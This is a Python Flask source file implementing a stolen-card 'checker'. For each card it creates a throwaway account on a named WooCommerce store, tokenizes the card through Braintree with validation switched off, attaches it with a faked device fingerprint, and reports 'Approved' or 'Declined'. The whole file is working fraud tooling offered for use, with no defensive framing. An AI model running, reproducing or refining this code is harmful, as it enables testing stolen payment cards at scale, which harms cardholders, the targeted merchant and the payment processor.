from flask import Flask, request, jsonify
import asyncio
import httpx
import re
import random
import string
import base64
import json
import uuid

app = Flask(__name__)

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

async def fetch_random_us_postal_code():
    states = ['CA', 'NY', 'TX', 'FL', 'IL']
    state = random.choice(states)
    url = f"http://api.zippopotam.us/us/{state}"
    
    async with httpx.AsyncClient() as client:
        response = await client.get(url)
        if response.status_code == 200:
            data = response.json()
            return random.choice(data['places'])['post code']
    
    return "10001"

async def process_card(cc):
    try:
        cc_number, month, year, cvv = cc.strip().split('|')
    except ValueError:
        return {'status': 'Invalid Format', 'cc': cc}

    user_agent = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()

    headers = {
        'authority': 'www.calipercovers.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': user_agent,
    }

    async with httpx.AsyncClient() as client:
        r1 = await client.get('https://www.calipercovers.com/my-account/', headers=headers)
        nonce = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', r1.text).group(1)

        data = {
            'username': username,
            'email': acc,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        await client.post('https://www.calipercovers.com/my-account/', headers=headers, data=data)

        r4 = await client.get('https://www.calipercovers.com/my-account/add-payment-method/', headers=headers)
        noncec = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r4.text).group(1)
        token = parseX(r4.text, 'var wc_braintree_client_token = ["', '"];')
        token = json.loads(base64.b64decode(token))['authorizationFingerprint']

        postal_code = await fetch_random_us_postal_code()

        braintree_headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'authorization': f'Bearer {token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user_agent,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc_number,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': postal_code,
                            'streetAddress': '',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        r5 = await client.post('https://payments.braintree-api.com/graphql', headers=braintree_headers, json=json_data)
        tok = r5.json()['data']['tokenizeCreditCard']['token']

        final_data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': '{"device_session_id":"4935f8f8454e5a4a68177503c5461496","fraud_merchant_id":null,"correlation_id":"796ce979-4236-4944-8bd6-567d266a"}',
            'woocommerce-add-payment-method-nonce': noncec,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        r6 = await client.post('https://www.calipercovers.com/my-account/add-payment-method/', headers=headers, data=final_data)

        if not r6.text.strip():
            return {'status': 'Approved', 'cc': cc}
        else:
            error_message = re.search(r'<ul class="woocommerce-error" role="alert">.*?</ul>', r6.text, re.DOTALL)
            if error_message:
                error_text = re.sub(r'<.*?>', '', error_message.group(0)).strip()
                return {'status': 'Declined', 'cc': cc, 'error': error_text}
            else:
                return {'status': 'Declined', 'cc': cc, 'response': r6.text.strip()}

@app.route('/process', methods=['GET'])
def process():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({'error': 'No CC provided'}), 400

    try:
        result = asyncio.run(process_card(cc))
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)